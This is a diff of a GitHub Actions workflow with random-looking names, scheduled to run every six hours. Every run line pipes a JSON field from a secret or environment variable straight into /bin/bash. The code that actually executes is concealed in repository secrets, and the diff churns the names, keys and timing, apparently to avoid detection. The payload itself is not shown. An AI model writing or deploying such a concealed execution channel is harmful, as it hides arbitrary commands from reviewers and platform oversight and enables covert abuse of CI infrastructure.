@@ -1,25 +1,21 @@
 name: xiangfeihsbyl
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '6 0/6 * * *'
 
-jobs:  # 20284
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiangfeihsbyl
         env:
-          nzkd4: ${{ secrets.nzkd4 }}
+          ylwnn5: ${{ secrets.ylwnn5 }}
         run: |
-          echo $nzkd4 | jq -r .ouv9 | /bin/bash
-          echo $whb3791 | jq -r .rqmr8 | /bin/bash
-          echo $w59548 | jq -r .lgul31285 | /bin/bash
-          echo $jny04918 | jq -r .tm316 | /bin/bash
-          echo $jkin7 | jq -r .gnlgb601 | /bin/bash
-          echo $jhav94472 | jq -r .mcpwi7909 | /bin/bash
-          echo $jfqz0 | jq -r .aeha49 | /bin/bash
-          echo $uxob5156 | jq -r .dm136 | /bin/bash
+          echo $ylwnn5 | jq -r .dhyxn399 | /bin/bash
+          echo $xq672 | jq -r .fdu588 | /bin/bash
+          echo $vzu7501 | jq -r .l9062 | /bin/bash
+          echo $h9 | jq -r .xnmwn6285 | /bin/bash
 
